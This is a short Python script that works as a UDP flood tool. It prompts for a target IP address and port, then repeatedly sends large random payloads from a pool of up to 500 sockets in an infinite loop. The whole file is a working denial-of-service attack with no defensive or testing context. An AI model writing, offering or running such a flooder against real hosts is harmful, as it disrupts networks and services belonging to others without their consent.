import socket
import os

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return s
    except socket.error as e:
        pass

def generate_random_payload(size):
    return os.urandom(size)

def send_udp_packets(target_ip, target_port, socket_count=1000):
    socket_count = min(socket_count, 500)

    socket_pool = [create_socket() for _ in range(socket_count) if create_socket()]

    payload_size = 10485  # Modify this value to adjust the payload size

    payload = generate_random_payload(payload_size)

    for s in socket_pool:
        try:
            s.sendto(payload, (target_ip, target_port))
        except socket.error as e:
            pass

    for s in socket_pool:
        s.close()

if __name__ == "__main__":
    target_ip = input("IP: ")
    target_port = int(input("Port: "))
    while True:
        send_udp_packets(target_ip, target_port)

